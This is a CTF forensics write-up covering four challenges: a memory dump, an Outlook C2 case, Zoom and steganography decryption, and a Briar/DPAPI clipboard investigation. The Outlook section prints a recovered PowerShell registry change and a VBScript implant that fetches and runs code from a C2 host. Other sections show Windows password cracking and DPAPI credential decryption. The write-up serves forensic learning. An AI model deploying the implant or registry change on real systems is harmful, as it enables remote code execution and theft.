---
title: BKISC CTF 2026 - Forensics
date: 2026-05-11 19:20:00 +0700
categories: [writeup]
tags: [forensics]
---

#

I had the oppoturnity to playtest all the Forensics challenges in BKISC CTF 2026. Here is my writeup for all of them (except for __The Interview__).

## Beautiful Memory

>_Surely no one will use_ `grep` _on the memdump, right? Right?_

Challenge gives us a memory dump. I used Volatility 3 to analyze it.

Running `pstree`, I noticed lots of `msedge.exe` processes running. Something fishy might be related to Edge. First thing I did was dumping out the `History` database, and

![image](/assets/images/bkiscctf2026-wu/1.png)

...i got lucky. This is a Pastebin link that contains the flag itself. But it is locked by a password. To get the Pastebin password, we need to retrieve the Windows password, use that to get the DPAPI masterkey, then unprotect the blob using that masterkey.

Problem is the Windows password couldn't be cracked using a standard `rockyou` wordlist. So are there any ways to unlock the Pastebin?

Turns out the answer is yes. Researchers find that when you start Edge, it decrypts and loads all the password into memory in __plaintext__. You can see the demo here: https://x.com/l1v1ng0ffth3l4n/status/2051308329880719730

I had taken a look into the PoC of this discovery and found that all the credentials could be extracted by searching for strings that match a regex. I then used `grep` on the memdump using that regex and actually found the password.

![image](/assets/images/bkiscctf2026-wu/2.png)

Flag: `BKISC{W3ll_M3mory_is_Str0nk_right_?}`

## Lookout

> _Standard 8386_.

Chall gives a disk image. 

### Initial recon

Based on challenge name and description (i wrote it lol), I headed to Outlook to check first. Parsing the `.ost` file using Recovery Toolbox for Outlook, I noticed `report.zip` was sent through mail to the victim. From this I assumed that the victim likely opened the zip and got their Lookout lobotomized.

In Desktop there was a `.pcap` file. This will be our main focus on this challenge.

### Diving into the traffic

The file is large so I looked for objects that could be exported. There's a highly suspicious file named `report.txt` that contains obfuscated PowerShell commands. Decoding gives:

```powershell
$tempRegFile = [System.IO.Path]::GetTempFileName() + ".reg"

$regContent = @"
Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\15.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Outlook\Webview\Inbox]
"url"="http://192.168.1.189:8386/plugin/search/"
"security"="yes"

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Ext\Stats\{261B8CA9-3BAF-4BD0-B0C2-BF04286785C6}\iexplore]
"Flags"=dword:00000004

[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\2]
"140C"=dword:00000000
"1200"=dword:00000000
"1201"=dword:00000003
"@

Set-Content -Path $tempRegFile -Value $regContent -Encoding Unicode
& reg.exe import "`"$tempRegFile`""
Remove-Item -Path $tempRegFile -Force
```

This script adds new URL fields to the Outlook registry, transforming Outlook into a C2 beacon.

It then downloads a VBScript code from the C2 server (two actually, ill just talk about the longer one):

```vb
Set outlookapp = window.external.OutlookApplication
Dim ay
Dim sync


Function requestpage(uri, rR)
	On Error Resume Next
	vi = Left(outlookapp.version,4)
	d = rR
	set oP = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
	oP.open "POST", uri,false
	oP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
	oP.setRequestHeader "Content-Length", Len(d)
	oP.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vi)
	oP.setOption 2, 13056
	oP.send Replace(d, vbLf, "")
	requestpage = oP.responseText
End Function

Sub downloadcode (uri)
        On Error Resume Next
		Set serverapp = outlookapp.CreateObject("MSXML2.ServerXMLHTTP")
		vr = Left(outlookapp.version,4)
		serverapp.open "GET", uri, False
		serverapp.setRequestHeader "User-Agent", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/7.0; Specula; Microsoft Outlook " & vr
		serverapp.send
		response = serverapp.ResponseText
        f = Left(response, 1)
		j = Int(Mid(response, 2, 4)) * 1000
		If Err.Number <> 0 Then
		    Exit Sub
		End If
		sync = j
		If f = 2 Then
		    Exit Sub
		ElseIf f = 1 Then
            ExecuteGlobal Crypt(Mid(response, 6), ay, False)
		Else
            ExecuteGlobal Mid(response, 6)
		End If
End Sub

Function readreg(path,value)
	On Error Resume Next
	Va = ""
	Set oL = outlookapp.CreateObject("WbemScripting.SWbemLocator")
   Set lr = oL.ConnectServer(".", "root\cimv2").Get("StdRegProv")
	lr.GetStringValue 2147483649, path, value, Va
	readreg = Va
End Function

Function Crypt(input, Key, Mode)
    For i = 1 To Len(input)
        Position = Position + 1
        If Position > Len(Key) Then Position = 1
        keyx = Asc(Mid(Key, Position, 1))
        If Mode Then
            orgx = Asc(Mid(input, i, 1))
            cptx = orgx Xor keyx
            cptString = Hex(cptx)
                        If Len(cptString) < 2 Then cptString = "0" & cptString
                        z = z & cptString
        Else
            If i > Len(input) \ 2 Then Exit For
            cptx = CByte("&H" & Mid(input, i * 2 - 1, 2))
            orgx = cptx Xor keyx
            z = z & Chr(orgx)
        End If
    Next
    Crypt = z
End Function

Function crypthelper(input, key, mode)
	l = Len(input)
	Dim j
	If mode Then
		ReDim j(l * 2)
	Else
		ReDim j(l / 2)
	End If
    For i = 1 To l
        Position = Position + 1
        If Position > Len(key) Then Position = 1
        kZ = Asc(Mid(key, Position, 1))
        If mode Then
            orZ = Asc(Mid(input, i, 1))
            cpt = orZ Xor kZ
            cptString = Hex(cpt)
			If Len(cptString) < 2 Then cptString = "0" & cptString
			j(i) = cptString
        Else
            If i > Len(input) \ 2 Then Exit For
            cpt = CByte("&H" & Mid(input, i * 2 - 1, 2))
            orZ = cpt Xor kZ
            j(i) = Chr(orZ)
        End If
    Next
    crypthelper = Join(j, "")
End Function

Function update_subscription()
    aluceps_coi = Int((2200 - 201 + 1) * Rnd + 0)
    if aluceps_coi = 1194 then
        Set ws = window.external.OutlookApplication.CreateObject("Wscript.shell")
        c = "cmd /c start https://github.com/trustedsec/specula/wiki/Why-am-I-seeing-this%3F"
	    ws.Run c, 0, true
    end if

    downloadcode "http://192.168.1.189:8386/css/dx7u7QYCSlbTbQ/rUe38nIs"
    window.setTimeout "update_subscription", sync, "VBScript"
End Function


oldstr = ""
sync = 10 * 1000
ay = readreg("Software\Microsoft\Office\"  & Left(outlookapp.version,4) & "\Outlook\UserInfo", "KEY")
window.setTimeout "update_subscription", sync, "VBScript"
```

What this script does:

1. Abuses a feature called "Outlook Home Pages" which allows VBScript injection.
2. Downloads code from C2 server (192.168.1.189:8386)
3. Dynamic execution: decides whether that code should be decrypted and executed or not based on header.
4. Crypt function: XOR with a key stored in Outlook registry

And the next blobs in the stream are encrypted. To understand what the blobs are, we just need to find the key and reverse XOR them.

The key is in __Software\Microsoft\Office\16.0\Outlook\UserInfo__:
![image](/assets/images/bkiscctf2026-wu/3.png)

By decrypting those blobs, I recovered an exfiltrated file named `flag.py`. I ran it and got the flag.

Flag: `BKISC{l0oK_Ou7_f0R_0u71o0k_C2!!!}`

### References

- https://trustedsec.com/blog/specula-turning-outlook-into-a-c2-with-one-registry-change

## Homework

> _honk shoo mimimimimimimimimi_

Chall gives a disk image.

### Debunking Zoom

According to the description, it seems like Zoom is our entrypoint for this challenge. I won't be explaining all the details here, if you want to DIY I recommend you to look in the References section.

Steps on how to decrypt Zoom main database:

- Crack the Windows password: first use `secretsdump` on the registry hives to dump the NTLM hash, then crack it using `John The Ripper`. The password we get is `Sup3rR0ckP4ss`.

- Crack the DPAPI masterkey: use `dpapi/masterkey` of `Impacket`: 
  
```bash
impacket-dpapi masterkey -file "1d4f66e2-0ad9-4e0b-9f17-c526c4920624" -sid S-1-5-21-2185385569-2550479847-782288727-1000 -password Sup3rR0ckP4ss
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 1d4f66e2-0ad9-4e0b-9f17-c526c4920624
Flags       :        5 (5)
Policy      :        0 (0)
MasterKeyLen: 000000b0 (176)
BackupKeyLen: 00000090 (144)
CredHistLen : 00000014 (20)
DomainKeyLen: 00000000 (0)

Decrypted key with User Key (SHA1)
Decrypted key: 0x416028ce358926baf81aae4bc79ef097efc76d999f266c38f4b3c861625e8700b222d8daccfb2d596438014c54ab50835eeb523f4ce6165a8491653e05e80bae
```

- Retrieve the Zoom key from `Zoom.us.ini`, strip the `ZWOSKEY` header then save as raw bytes.

- `unprotect` the key:
 
```bash
impacket-dpapi unprotect -file "zoom_blob.bin" -key 0x416028ce358926baf81aae4bc79ef097efc76d999f266c38f4b3c861625e8700b222d8daccfb2d596438014c54ab50835eeb523f4ce6165a8491653e05e80bae
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Successfully decrypted data
 0000   6E 63 6A 34 48 4E 31 34  45 4D 67 6D 66 31 74 75   ncj4HN14EMgmf1tu
 0010   50 71 41 76 30 46 76 59  52 58 7A 68 71 6C 35 4D   PqAv0FvYRXzhql5M
 0020   2B 38 62 5A 66 33 2F 73  76 31 6B 3D               +8bZf3/sv1k=
```

This is the key to decrypt the SQLCipher Zoom database.
 
- Decrypt `zoommeeting.enc.db` with the following params:
   ![image](/assets/images/bkiscctf2026-wu/4.png)
 
Now we can see what was going on in the class!
 
### The Homework
 
There is a Drive link from the chat. Downloading gives `homework.rar`. `key.txt` said:

> You have learnt magic in recent online course, the magic that turn a JPG to a PNG, find the key here and do the homework !!!
All you need is in this rar file.

I inspected the `.jpg` file and noticed there were garbage bytes after `ff d9`. Standard steg tools didn't work, so how to do this?

The method applied here is called __Angecryption__. It is a method that could encrypt/decrypt a valid file into another valid file. This method could be described simply as follows:

![image](/assets/images/bkiscctf2026-wu/5.png)

Because the junk appended at the end could be "controlled", we can hide a second image that gets revealed by reversing the process. And because Windows only looks for a valid header to determine the file type, we can totally put those junk bytes at the start of the original file.

But where are the key and IV? Those are hidden inside the ADS of the `.rar`:
![image](/assets/images/bkiscctf2026-wu/6.png)

With all the information needed, I wrote a script to get the hidden image:

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import os

def decrypt_image(input_file, output_file):
    cipher = AES.new(b'N3v3rG0n4G1v3UUP', AES.MODE_CBC, bytes.fromhex('5778a7db75851bc63d8deed06a5d894f'))

    with open(input_file, 'rb') as f:
        encrypted_data = f.read()
        decrypted_data = cipher.encrypt(encrypted_data)

    with open(output_file, 'wb') as f:
        f.write(decrypted_data)

decrypt_image('homework.jpg', 'decrypted_image.png')
```

And I got the flag!
   ![image](/assets/images/bkiscctf2026-wu/7.png)

Flag: `BKISC{Y0u_G0t_A_F0r_Th1s_St3g4n0gr4phy_Cl4ss}`

### References

- https://infosecwriteups.com/decrypting-zoom-team-chat-forensic-analysis-of-encrypted-chat-databases-394d5c471e60
- CrewCrow challenge from HackTheBox
- https://www.youtube.com/watch?v=wbHkVZfCNuE (Angecryption)
- https://www.slideshare.net/slideshow/when-aes-episode-v/34855971#52

## Deleted Secrets

> long ass chall

Chall gives a disk image.

### Snooping around

First thing I saw was Thunderbird so I decided to check it. There was a mail between two threat actors. The sender gave a `.zip` file to the receiver, and told them to install an app called `Briar` for further discussion. There was also `nuke.py` on disk, so I suspected the threat actor deleted all the evidences beforehand. 

### The artifact

Windows Search Indexer records contents from a few file types (`.pdf`, `.txt`,...) in the AutoSummary column. I headed to Windows.edb and found something interesting:
   ![image](/assets/images/bkiscctf2026-wu/8.png)

A part of `target.txt` and `Instructions.pdf` was cached. There was a base32 string in `target.txt` which decodes to a part of the flag `BKISC{Woah_I_r34lly_dunno_`

### Briar

Briar is an open-source chat app, so I cloned the Git repo to understand how it works.

Briar stores its database key inside `db.key`. The file contains the actual secret key, but it's encrypted using the Briar password. Before finding the password, I'll talk about how the encryption scheme in Briar works.

- `db.key` has a certain format:

```bash
Offset   Size    Field
------   ----    -----
0        1B      Format version
                      0x00 = plain scrypt
                      0x01 = scrypt + KeyStrengthener (e.g. hardware-backed)
1        32B     Salt (random bytes, used as input to scrypt)
33       4B      Cost parameter N (uint32, big-endian)
37       24B     IV / nonce (random bytes, used as input to cipher)
61       ?B      Ciphertext + 16-byte Poly1305 MAC tag
```
- Briar user password is plugged into Scrypt (brute-forcing is very slow) along with some more params
- Uses XSalsa20Poly1305 on the output of KDF (Scrypt), then outputs the key which is used to connect to the database.

To do all this, what I needed was the user password. Where could it be?

### Windows pinned clipboard

The threat actor made a mistake and stored their Briar password in Windows clipboard, so let's decrypt to find it.

The clipboard blob is in `C:\Users\supadupadev\AppData\Local\Microsoft\Windows\Clipboard\Pinned\<outer GUID>\<item GUID>\VGV4dA==`

This blob is a CMS EnvelopedData file. It is protected by DPAPI-NG. To decrypt, first dump and parse it using the ASN.1 format by using `openssl`:

```bash
openssl asn1parse -inform DER -in clipboard_blob.bin
    0:d=0  hl=4 l= 449 cons: SEQUENCE
    4:d=1  hl=2 l=   9 prim: OBJECT            :pkcs7-envelopedData
   15:d=1  hl=4 l= 434 cons: cont [ 0 ]
   19:d=2  hl=4 l= 430 cons: SEQUENCE
   23:d=3  hl=2 l=   1 prim: INTEGER           :02
   26:d=3  hl=4 l= 378 cons: SET
   30:d=4  hl=4 l= 374 cons: cont [ 2 ]
   34:d=5  hl=2 l=   1 prim: INTEGER           :04
   37:d=5  hl=4 l= 312 cons: SEQUENCE
   41:d=6  hl=4 l= 262 prim: OCTET STRING      [HEX DUMP]:01000000D08C9DDF0115D1118C7A00C04FC297EB01000000464D3933D9414E4986C71B0EA4D0D5C90000000002000000000010660000000100002000000042BCAF6862552BAC26B4509A59211688E637D38C01ADD1CCDD89FF7B4F4446B7000000000E8000000002000020000000080A9BF9D836E0440A5568E1B1258227BB5D0FBFB3B81F2E449B2CD006D47445300000000B7DDA286531BCAF625159B3652BA08736B02B8AD2783EF8BB075B33F667DB24CCD21703D12C38A31A53C1DB5B090C06400000006F491754F90F9F9A1765AFF53576005D4A8C079349CED82F654C9E3DC2786A5BFF44133E1C42DB857C0056F60A4907A2C0B16A6E06348ECD13D608859943E96F
  307:d=6  hl=2 l=  44 cons: SEQUENCE
  309:d=7  hl=2 l=   9 prim: OBJECT            :1.3.6.1.4.1.311.74.1
  320:d=7  hl=2 l=  31 cons: SEQUENCE
  322:d=8  hl=2 l=  10 prim: OBJECT            :1.3.6.1.4.1.311.74.1.8
  334:d=8  hl=2 l=  17 cons: SEQUENCE
  336:d=9  hl=2 l=  15 cons: SEQUENCE
  338:d=10 hl=2 l=  13 cons: SEQUENCE
  340:d=11 hl=2 l=   5 prim: UTF8STRING        :LOCAL
  347:d=11 hl=2 l=   4 prim: UTF8STRING        :user
  353:d=5  hl=2 l=  11 cons: SEQUENCE
  355:d=6  hl=2 l=   9 prim: OBJECT            :id-aes256-wrap
  366:d=5  hl=2 l=  40 prim: OCTET STRING      [HEX DUMP]:CF1E6E54FC949774F120F56C4B421D262B8D432E016A7CC7F80EB2E8B11C18992B86B1FC41B5E749
  408:d=3  hl=2 l=  43 cons: SEQUENCE
  410:d=4  hl=2 l=   9 prim: OBJECT            :pkcs7-data
  421:d=4  hl=2 l=  30 cons: SEQUENCE
  423:d=5  hl=2 l=   9 prim: OBJECT            :aes-256-gcm
  434:d=5  hl=2 l=  17 cons: SEQUENCE
  436:d=6  hl=2 l=  12 prim: OCTET STRING      [HEX DUMP]:ECBBD73E345BD7F530F4BAA0
  450:d=6  hl=2 l=   1 prim: INTEGER           :10
  453:d=0  hl=2 l=   5 cons: appl [ 23 ]
Error in encoding
40E7E1430D7A0000:error:0680007B:asn1 encoding routines:ASN1_get_object:header too long:../crypto/asn1/asn1_lib.c:105:
```

That huge blob from offset 41 is Key Encryption Key (KEK).

Get the DPAPI masterkey as normal, then, unprotect this blob:

```bash
impacket-dpapi unprotect -file clipboard_dpapi.bin -key 0x4d59a1889dfd27ae39ad952533f9c070b77e90536308ef94c331be330e3973384d28d62ce4681f670304507387c5a444f86d6a65d17a2348b366e204f6d48931
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Successfully decrypted data
 0000   29 1B F7 6C 9F 97 01 E5  0E 27 80 31 54 9D 86 05   )..l.....'.1T...
 0010   47 D2 D1 78 B6 3F BA F3  57 F9 26 21 68 78 55 71   G..x.?..W.&!hxUq
```
Unwrap the actual key by using the blob in offset 366, then AES decrypt the remaining data (from offset 453) using the unwrapped key and IV (offset 436):

```python
from cryptography.hazmat.primitives.keywrap import aes_key_unwrap
from cryptography.hazmat.backends import default_backend
from Crypto.Cipher import AES

# Output from impacket = KEK, not CEK
kek = bytes.fromhex("291BF76C9F9701E50E278031549D860547D2D178B63FBAF357F9262168785571")

# Wrapped CEK from ASN.1 offset 366 (40 bytes)
wrapped_cek = bytes.fromhex("CF1E6E54FC949774F120F56C4B421D262B8D432E016A7CC7F80EB2E8B11C18992B86B1FC41B5E749")

# Unwrap to get actual CEK (RFC 3394)
cek = aes_key_unwrap(kek, wrapped_cek, default_backend())
print("CEK:", cek.hex())

# Now decrypt with AES-256-GCM
iv = bytes.fromhex("ECBBD73E345BD7F530F4BAA0")

with open("clipboard_blob.bin", "rb") as f:
    data = f.read()

ciphertext = data[453:]
ct, tag = ciphertext[:-16], ciphertext[-16:]

cipher = AES.new(cek, AES.MODE_GCM, nonce=iv)
plaintext = cipher.decrypt_and_verify(ct, tag)
print(plaintext.decode("utf-16-le"))
```

This script outputs the content from clipboard, which is `Gho67qqxmv36!26@@@`.

### Connecting to database

I asked Claude (😭) to recreate the encryption scheme from Briar and get the 32-byte database key:

```python
import sys
import hashlib
import struct
import argparse
import time
import nacl.secret
import nacl.exceptions

DB_KEY_HEX = "00F63DA9BC7C9265B50E5FD921C729799484E9967FFB6BAFE1BE2C0C03F3E30AF900020000ED30F33974FA2733D83D9830A260D63320AC5CA04023FF33F92172EF547F54FA261C705ECBF9B5C38817A6B7290138F751FFBE8E806E1DBCBF61EB62A9F4FBF66AAA739808AA7738"
DATA = bytes.fromhex(DB_KEY_HEX)

def parse_blob(hex_str):
    data = bytes.fromhex(hex_str.replace("\n", "").replace(" ", ""))

    format_ver = data[0]          # 1 byte
    salt       = data[1:33]       # 32 bytes
    cost       = struct.unpack(">I", data[33:37])[0]  # 4 bytes, big-endian uint32
    iv         = data[37:61]      # 24 bytes
    ciphertext = data[61:]        # remaining bytes (ciphertext + MAC)

    return format_ver, salt, cost, iv, ciphertext

SCRYPT_R = 8   # hardcoded in Briar's PasswordBasedKdf
SCRYPT_P = 1   # hardcoded in Briar's PasswordBasedKdf
KEY_LEN  = 32  # SecretKey.LENGTH in Briar


def derive_key(password: str, salt: bytes, cost: int) -> bytes:
    return hashlib.scrypt(
        password=password.encode("utf-8"),
        salt=salt,
        n=cost,       # CPU/memory cost (131072 in our blob)
        r=SCRYPT_R,   # block size
        p=SCRYPT_P,   # parallelization
        dklen=KEY_LEN,# output length = 32 bytes
        maxmem = 256 * 1024 * 1024 
    )

def try_password(password: str, salt: bytes, cost: int, iv: bytes, ciphertext: bytes):
    """
    Returns the decrypted 32-byte SecretKey if password is correct.
    Returns None if password is wrong (MAC verification failed).
    """
    # Step 1: derive 32-byte key from password using scrypt
    candidate_key = derive_key(password, salt, cost)

    # Step 2: attempt XSalsa20Poly1305 decryption
    # PyNaCl's SecretBox.decrypt() internally:
    #   - decrypts with XSalsa20 using candidate_key + iv
    #   - verifies Poly1305 MAC
    #   - raises CryptoError if MAC doesn't match (wrong password)
    try:
        box = nacl.secret.SecretBox(candidate_key)
        plaintext = box.decrypt(ciphertext, nonce=iv)
        return plaintext  # 32 bytes = the raw database SecretKey
    except nacl.exceptions.CryptoError:
        return None  # wrong password

def main():
    PASSWORD = "Gho67qqxmv36!26@@@"  # <-- paste the known password here

    format_ver, salt, cost, iv, ciphertext = parse_blob(DB_KEY_HEX)

    print(f"[*] Deriving key with scrypt (may take a moment)...")
    result = try_password(PASSWORD, salt, cost, iv, ciphertext)

    if result is not None:
        print(f"[+] SUCCESS!")
        print(f"[+] Database key (hex): {result.hex()}")
        print(f"[+] Database key (b64): {__import__('base64').b64encode(result).decode()}")
    else:
        print(f"[-] Decryption failed — wrong password or corrupted blob.")


if __name__ == "__main__":
    main()
```

```bash
[*] Deriving key with scrypt (may take a moment)...
[+] SUCCESS!
[+] Database key (hex): 84302fcb7c58a97a8e7a4cf5fc645a3875a4359f19a1ac0187e3f24020f01e03
[+] Database key (b64): hDAvy3xYqXqOekz1/GRaOHWkNZ8ZoawBh+PyQCDwHgM=
```

This is how Briar uses the derived key to connect to the database:
   ![image](/assets/images/bkiscctf2026-wu/9.png)

Username is `user`. Password is uppercase database key + the string `password`.

### The malicious tool

```
- Hi
- I'll give you the tools I vibe
- https://drive.google.com/drive/folders/...
- what is the password btw
- Its in the secret pdf file
- alr
```

I got `tools.zip` from the Drive link. Unzip it using the secret from `Instructions.pdf`, which is `Mot_con_vit_xoe_r4_h4i_c4i_c4nh!!!` to get `tools.exe`. This file contains a Gist link. I went to it and saw a weird encoded string:

![image](/assets/images/bkiscctf2026-wu/10.png)

This is the second part of the flag encoded in Base45.

Flag: `BKISC{Woah_I_r34lly_dunno_whut_t0_s4y_here_n0_idea_T^T}`

### References 
- https://www.levelblue.com/blogs/spiderlabs-blog/windows-search-index-the-forensic-artifact-youve-been-searching-for
- https://thinkdfir.com/2018/10/14/clippy-history/ (not very detailed on how to decrypt DPAPI-NG)

## Notes

I've learned a lot of new stuffs from doing these challs. I want to give a thanks to the authors (Te0f, KangTheConq and Eenosse) for constantly guiding and giving hints.






